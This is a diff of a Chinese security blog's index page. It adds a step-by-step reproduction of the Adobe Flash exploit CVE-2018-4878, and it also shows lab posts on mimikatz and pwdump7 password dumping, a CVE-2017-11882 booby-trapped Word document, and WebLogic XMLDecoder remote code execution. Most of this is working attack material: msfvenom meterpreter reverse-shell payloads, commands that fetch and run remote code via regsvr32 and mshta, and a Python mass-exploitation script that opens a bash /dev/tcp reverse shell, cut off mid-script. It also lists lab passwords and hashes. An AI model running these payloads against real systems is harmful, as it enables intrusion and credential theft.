@@ -254,6 +254,92 @@
         
           <section id="main" style="float:none;">
   
+    <article id="post-Adobe远程代码执行漏洞-CVE-2018-4878"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2018/03/06/Adobe远程代码执行漏洞-CVE-2018-4878/">Adobe远程代码执行漏洞-CVE-2018-4878</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/03/06/Adobe远程代码执行漏洞-CVE-2018-4878/" class="article-date">
+	  <time datetime="2018-03-06T04:52:08.000Z" itemprop="datePublished">2018-03-06</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Adobe远程代码执行漏洞-CVE-2018-4878"><a href="#Adobe远程代码执行漏洞-CVE-2018-4878" class="headerlink" title="Adobe远程代码执行漏洞-CVE-2018-4878"></a>Adobe远程代码执行漏洞-CVE-2018-4878</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&emsp;&emsp;2018年2月1日， Adobe官方发布了Adobe Flash Player系列产品的安全通告（APSA18-01），一个最新的Adobe Flash零日漏洞被发现针对韩国地区的人员发起攻击，该0day漏洞编号为CVE-2018-4878，目前最新版本28.0.0.137及其以前版本的Adobe Flash Player均受漏洞影响，Adobe官方将于2月5日发布漏洞补丁。CVE-2018-4878的被用于针对Windows用户的有限的针对性攻击。这些攻击利用通过电子邮件分发嵌入式恶意Flash内容的Office文档。    </p>
+<p>&emsp;&emsp;如下图所示影响 Flash Player28.0.0.137以及之前的所有版本 </p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/gmdcKDH43c.png?imageslim" alt="mark"></p>
+<p><a href="https://helpx.adobe.com/security/products/flash-player/apsa18-01.html" target="_blank" rel="noopener">https://helpx.adobe.com/security/products/flash-player/apsa18-01.html</a></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-生成payload"><a href="#第一步-生成payload" class="headerlink" title="第一步 生成payload"></a>第一步 生成payload</h3><p>进入CVE-2018-4878-payload目录中</p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/IjKa0j63b4.png?imageslim" alt="mark"></p>
+<p>用msfvenom生成python语言的shellcode。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.11 lport=8118  -f  python&gt;shellcode.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode.txt</span><br></pre></td></tr></table></figure>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/Fb2KLdG5E9.png?imageslim" alt="mark"></p>
+<p>生成目录如下图所示（如需更改vim编辑）：</p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/3i5J1f12a2.png?imageslim" alt="mark"></p>
+<p>把使用实验环境所给的tmp.py文件追加到已经把shellcode.txt改名为payload.py文件中。得到最终的payload.py才是我们的攻击完整的程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp shellcode.txt payload.py</span><br><span class="line">cat tmp.py &gt;&gt;payload.py</span><br></pre></td></tr></table></figure>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/gdL4GdLd91.png?imageslim" alt="mark"></p>
+<p>payload.py 文件部分如下，可以根据情况更改：</p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/eii5iA38Lf.png?imageslim" alt="mark"></p>
+<p>执行我们的攻击程序payload.py。生成exploit.swf与index.html文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python payload.py</span><br></pre></td></tr></table></figure>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/b3E49AAmIC.png?imageslim" alt="mark"></p>
+<p>接下来开启apache服务也就是我们的Web服务诱导目标用户访问。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 start</span><br></pre></td></tr></table></figure>
+<p>sudo  需要输入密码 为360College</p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/Jbc72gJC5f.png?imageslim" alt="mark"></p>
+<p>可以看到Apache服务开启。我们再吧index.html与exploit.swf文件复制到/var/www/html目录下也就是Apache服务器的web访问目录，使用户可以访问我们的这些文件，从而漏洞利用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp index.html /var/www/html/index2.html </span><br><span class="line">sudo cp exploit.swf /var/www/html/exploit.swf</span><br></pre></td></tr></table></figure>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/B6a878HdA2.png?imageslim" alt="mark"></p>
+<h3 id="第二步-Metasploit-利用"><a href="#第二步-Metasploit-利用" class="headerlink" title="第二步 Metasploit 利用"></a>第二步 Metasploit 利用</h3><p>启动Metasploit，执行以下命令，监听端口，等待目标上钩，反弹shell到kali攻击机。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.0.11 [攻击机IP地址]</span><br><span class="line">set lport 8118</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/G3lj8ieiIm.png?imageslim" alt="mark"></p>
+<h3 id="第三步-靶机上钩"><a href="#第三步-靶机上钩" class="headerlink" title="第三步 靶机上钩"></a>第三步 靶机上钩</h3><p>在靶机上，安装Adobe Flash Player软件。点击安装，下一步即可安装。</p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/Gb7laaD5D9.png?imageslim" alt="mark"></p>
+<p>安装成功。</p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/358k6HgECj.png?imageslim" alt="mark"></p>
+<p>打开IE浏览器。</p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/6LB724akc2.png?imageslim" alt="mark"></p>
+<p>在IE浏览器上输入。kali攻击机IP地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.11   [kali攻击机IP地址]</span><br></pre></td></tr></table></figure>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/1Dijdmkmdb.png?imageslim" alt="mark"></p>
+<h3 id="第三步-后渗透阶段"><a href="#第三步-后渗透阶段" class="headerlink" title="第三步 后渗透阶段"></a>第三步 后渗透阶段</h3><p>靶机在输入kali攻击机IP地址后，在kali攻击机中的msf可以看到。成功反弹靶机shell。</p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/eb1eAiIf0i.png?imageslim" alt="mark"></p>
+<p>得到meterpreter，输入sysinfo看到靶机的系统信息。可进一步的渗透。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180728/Ekk6ElEma1.png?imageslim" alt="mark"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-口令暴破解实验"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
@@ -290,19 +376,19 @@
 <h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1、使用-mimikatz-获取明文密码"><a href="#1、使用-mimikatz-获取明文密码" class="headerlink" title="1、使用 mimikatz 获取明文密码"></a>1、使用 mimikatz 获取明文密码</h3><p>​    mimikatz是一款功能强大的轻量级调试神器，提升进程权限注入进程读取进程内存，使用 mimikatz 获取明文密码。</p>
 <p>首先用管理员身份打开命令终端窗口cmd。</p>
 <p>&emsp;&emsp;使用 mimikatz 获取明文密码，用管理员身份打开命令终端窗口cmd。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/98dcfjKm8h.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180726/98dcfjKm8h.png?imageslim" alt="mark"></p>
 <p>点击确定</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/AhE26DIjKL.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180726/AhE26DIjKL.png?imageslim" alt="mark"></p>
 <p>复制目录文件，到桌面下mimikatz_trunk目录下的Win32目录下并执行mimikatz命令。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/gH1A7ge6mm.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180726/gH1A7ge6mm.png?imageslim" alt="mark"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\college\Desktop\mimikatz_trunk\Win32</span><br><span class="line">mimikatz</span><br></pre></td></tr></table></figure>
 <p>执行mimikatz命令后可看到进入mimikatz软件交互界面。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/89JG2djG92.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180726/89JG2djG92.png?imageslim" alt="mark"></p>
 <p>进入mimikatz软件交互界面后执行以下命令。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/DHc1fJI62K.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180726/DHc1fJI62K.png?imageslim" alt="mark"></p>
 <p>如图所示得到明文密码，另SHA1密码可在线破解</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/gb1Ba8L4J4.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180726/gb1Ba8L4J4.png?imageslim" alt="mark"></p>
 <h3 id="2、使用-pwdump7-获取密码NTLM-hash"><a href="#2、使用-pwdump7-获取密码NTLM-hash" class="headerlink" title="2、使用 pwdump7 获取密码NTLM hash"></a>2、使用 pwdump7 获取密码NTLM hash</h3><p>NTLM hash是指Windows系统下Security Account Manager中保存的用户密码hash</p>
 <p>该NTLM hash的生成方法：</p>
 <ol>
@@ -314,11 +400,11 @@
 </li>
 </ol>
 <p>同上一个实验，进入管理员cmd，进入pwdump7 目录，执行以下命令，可得到本地NTLM hash。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd C:\Users\college\Desktop\pwdump7</span><br><span class="line"></span><br><span class="line">pwdump7</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/8bH8Ca0h0d.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180726/8bH8Ca0h0d.png?imageslim" alt="mark"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">college:1000:NO PASSWORD*********************:7C70A81C7C5882C24298D391FD397885:::</span><br><span class="line">user:1001:NO PASSWORD*********************:57D583AA46D571502AAD4BB7AEA09C70:::</span><br></pre></td></tr></table></figure>
 <p>可在线破解NTLM 密码</p>
 <p><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/76C0ak8f29.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180726/76C0ak8f29.png?imageslim" alt="mark"></p>
 <h2 id="思考与总结"><a href="#思考与总结" class="headerlink" title="思考与总结"></a>思考与总结</h2><p>&emsp;&emsp;通过本次实验，成功实现了Windows 下密码的抓取与剖解，了解windows系统密码Hash 相关知识。</p>
 
       
@@ -570,7 +656,7 @@
 <p><strong>poc</strong>：</p>
 <p><a href="http://www.bugsafe.cn/archives/136.html" target="_blank" rel="noopener">http://www.bugsafe.cn/archives/136.html</a></p>
 <p>首先,快速验证目标是否存在此漏洞,浏览器访问 poc url : /wls-wsat/CoordinatorPortType 看到类似下面的返回则说明目标机器可能存在此漏洞<br>http://[目标IP] /wls-wsat/CoordinatorPortType    </p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/181017/aLlLklAHla.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/181017/aLlLklAHla.png?imageslim" alt="mark"></p>
 <p>而后,直接把下面的请求贴到 burpsuite 的 repeater 模块中进行请求,以此在目标机器上触发漏洞并执行我们的 payload,具体如下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.3.195</span><br><span class="line">Accept-Encoding: identity Content-Length: 695</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</span><br><span class="line">Connection: keep-alive Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;cmd.exe&lt;/string&gt; #于执行 payload 代码的命令解释器,如果是在 linux 中,此处通常应该为/bin/bash</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt; #不交互,在 linux 下的选项写法为-c</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="2"&gt;</span><br><span class="line"><span class="meta">string&gt;</span>regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll&lt;/string&gt;	实际要执行的 payload 代码,直接远程下载执行,linux 中可以用 wget 或者 curl,然后管道交给 bash 去执行</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
 <p>点击’go’ 之后便 meterpreter 已正常回连</p>
@@ -1489,27 +1575,27 @@
 <p><a href="https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455</a></p>
 <p><a href="https://www.anquanke.com/post/id/87311" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87311</a></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-漏洞验证"><a href="#第一步-漏洞验证" class="headerlink" title="第一步 漏洞验证"></a>第一步 漏洞验证</h3><p>&emsp;&emsp;登录kali攻击机，进入用户home文件中的CVE-2017-1182-payload目录。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/b8icLIKf9B.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/b8icLIKf9B.png?imageslim" alt="mark"></p>
 <p>执行以下命令生成payload-cale.doc文件，为漏洞payload（漏洞利用程序），弹出计算机程序验证漏洞是否存在。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o payload-cale.doc</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/KlKHk314gI.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/KlKHk314gI.png?imageslim" alt="mark"></p>
 <p>接下来要把payload-cale.doc文件上传到windows靶机，受害者打开doc文件，漏洞执行利用。</p>
 <p>登录windows靶机，打开FTP服务器。直接payload-cale.doc文件上传到此靶机上，真实环境下可利用社会工程学。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/b8Le52ee2g.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/b8Le52ee2g.png?imageslim" alt="mark"></p>
 <p>打开FTP服务器。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/8ELED7HHmd.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/8ELED7HHmd.png?imageslim" alt="mark"></p>
 <p>在kali攻击机登录ftp。输入账号密码。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/FajJL8475F.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/FajJL8475F.png?imageslim" alt="mark"></p>
 <p>上传到靶机上，上传目录是桌面。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put payload-cale.doc</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/2AdIEE1BbF.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/2AdIEE1BbF.png?imageslim" alt="mark"></p>
 <p>成功上传到靶机桌面上。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/3IGCFGijBH.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/3IGCFGijBH.png?imageslim" alt="mark"></p>
 <p>点击payload-cale.doc文件可看到执行计算机弹窗效果，实验验证成功，说明靶机存在此漏洞。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/feieClHfEe.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/feieClHfEe.png?imageslim" alt="mark"></p>
 <h3 id="第二步-漏洞利用"><a href="#第二步-漏洞利用" class="headerlink" title="第二步 漏洞利用"></a>第二步 漏洞利用</h3><p>在kali攻击机上启动msf  。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/fa84298f6f.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/fa84298f6f.png?imageslim" alt="mark"></p>
 <p>查找CVE-2017-11882 漏洞(攻击机已经集成攻击程序)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2017-11882</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/CVE-2017-11882</span><br></pre></td></tr></table></figure>
@@ -1522,20 +1608,20 @@
 <p>设置uri的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set URIPATH payload</span><br></pre></td></tr></table></figure></p>
 <p>运行payload,启动利用后，msf会监听本机8080端口，靶机访问192.168.0.23:8080/payload.doc，打开doc触发就会得到反弹到4444端口的tcp会话中</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/Ce4E70D3l6.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/Ce4E70D3l6.png?imageslim" alt="mark"></p>
 <p>在/home/college/CVE-2017-11882-payload目录下中执行以下命令：生成 payload.doc </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;mshta http://192.168.0.11[kali操作机地址]:8080 /payload&quot; -o payload.doc</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/dFKk1Lf8fJ.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/dFKk1Lf8fJ.png?imageslim" alt="mark"></p>
 <p>同样通过ftp上传到桌面上，再点击执行 payload.doc 。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br><span class="line">put payload.doc</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/KFADlLaIHD.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/J2aAl6El0j.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/KFADlLaIHD.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/J2aAl6El0j.png?imageslim" alt="mark"></p>
 <h3 id="第三步-后渗透阶段"><a href="#第三步-后渗透阶段" class="headerlink" title="第三步 后渗透阶段"></a>第三步 后渗透阶段</h3><p>可以看到成功反弹shell，session 1 进入meterpreter终端中。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session 1</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/9dDGmEj004.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/9dDGmEj004.png?imageslim" alt="mark"></p>
 <p>查看系统信息，如下。进一步可以使用meterpreter进行后渗透攻击。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180727/7fj8f6GElC.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180727/7fj8f6GElC.png?imageslim" alt="mark"></p>
 
       
     </div>
@@ -1586,9 +1672,9 @@
 <li><a href="https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md" target="_blank" rel="noopener">https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices组件反序列化漏洞分析.md</a></li>
 <li><a href="http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html" target="_blank" rel="noopener">http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html</a></li>
 </ul>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="http://wfwewefw.yuxuni.cn/blog/180402/9agkkF85iF.png?imageslim" alt="mark"></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="http://pn49yk1z4.bkt.clouddn.com/180402/9agkkF85iF.png?imageslim" alt="mark"></p>
 <p>nc 监听 21端口</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180402/g7lbLkGe4g.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180402/g7lbLkGe4g.png?imageslim" alt="mark"></p>
 <p>python3 批量利用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/xml"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url)</span>:</span></span><br><span class="line">    data = <span class="string">'''</span></span><br><span class="line"><span class="string">	&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">	&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span></span><br><span class="line"><span class="string">	&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span></span><br><span class="line"><span class="string">	&lt;void class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">	&lt;array class="java.lang.String" length="3"&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="0"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="1"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="2"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.102/21 0&amp;gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;/array&gt;</span></span><br><span class="line"><span class="string">	&lt;void method="start"/&gt;&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;/java&gt;</span></span><br><span class="line"><span class="string">	&lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">	&lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">	